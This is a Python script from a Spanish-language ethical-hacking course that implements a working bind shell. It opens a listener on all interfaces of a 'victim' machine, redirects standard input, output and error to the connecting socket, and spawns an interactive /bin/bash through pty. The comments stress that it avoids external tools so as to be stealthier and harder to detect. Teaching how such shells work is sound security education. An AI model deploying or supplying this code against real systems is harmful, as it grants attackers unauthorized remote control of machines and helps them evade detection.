#*********************************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Realizamos una bind shell, abriendo un listener en la vćitima. Se trata de obtener el control de la máquina víctima
#para poder realizar acciones en ella. Existen herramientas externas que efectúan bind  shell-s de manera sencilla,
#pero este script no las utiliza, sino que trata de crear procedimientos que sean más difíciles de detectar, más sigilosos,
#utilizando módulos propios del SDK de Python, los que están disponibles en el propio lenguaje.
#Es más complejo que la Reverse Shell ya que en la Bind Shell tenemos que encargarnos de poner a la escucha el listener 
#mientras que en la Reverse Shell shell había que hacerlo en la máquina atacante
#Consideramos como máquina "servidor" a la víctima (la que activa el listener a la espera de conexiones) y como clientes a las que
#se conecten a dicho puerto.
#Estabilizamos la shell obtenida utilizando la librería pty, de tal manera que el prompt vaya variando
#dependiendo del directorio en el que nos hallemos. 
#*********************************************************************************************************************************

import socket, os, subprocess, pty


#Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
def validar_puerto(puerto):
    try:
        puerto = int(puerto)
        if 1 <= puerto <= 65535:
            return True
        else:
            return False
    except ValueError:
        return False

#Función para pedir los datos de entrada al usuario. Los valida, y, si son correctos, los devuelve. 
def solicitar_datos_usuario():
    puerto_correcto=False
    while not puerto_correcto:
        puerto = input('>> Introduce el puerto en el que quieres establecer la conexión, entre 1 y 65535: ')
        if validar_puerto(puerto):
            puerto_correcto=True
    return puerto

if __name__ == "__main__":    
    #Solicitamos el dato de entrada al usuario, y lo recogemos en la variable "puerto_listener"
    puerto_listener=solicitar_datos_usuario()
    #Creamos un objeto de la clase socket() de la librería socket
    #Argumentos:
    #socket.AF_INET: con esto indicamos que se usará el protocolo Internet
    #socket.sock_stream: se usará un socket de flujo, TCP. 
    servidor_victima=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #Vinculamos todas las interfaces del servidor -la víctima- (dirección IP 0.0.0.0) con el puerto introducido por el usuario
    servidor_victima.bind (("0.0.0.0", int(puerto_listener)))
    print (f"A la escucha en el puerto {puerto_listener}")
    print ("--------------------------------------------")
    servidor_victima.listen()
    cliente_atacante,direccion=servidor_victima.accept()
    #En sistemas GNU/Linux, la función dup() es una llamada al sistema que se utiliza para duplicar un descriptor de archivo, que es 
    #es un identificador numérico que el sistema operativo utiliza para hacer referencia a un archivo abierto, un socket o cualquier otro recurso de E/S.
    #Utilizamos la función dup2 para duplicar la entrada (0), salida  (1) y error (2) al descriptor de archivo del socket que tenemos abierto (usamos el 
    #método fileno para ello). Gracias a todo ello, podremos ejecutar comandos en el equipo servidor. 
    os.dup2(cliente_atacante.fileno(),0)
    os.dup2(cliente_atacante.fileno(),1)
    os.dup2(cliente_atacante.fileno(),2)
    #pty.spawn() es una función de la biblioteca pty  que se utiliza para iniciar un programa en una nueva pseudo terminal (pty).
    #En este caso, el programa que se inicia es /bin/bash, permitiendo al usuario ejecutar comandos y recibir la salida correspondiente
    #como si estuviera utilizando un terminal normal
    pty.spawn("/bin/bash")
    servidor_victima.close()
        
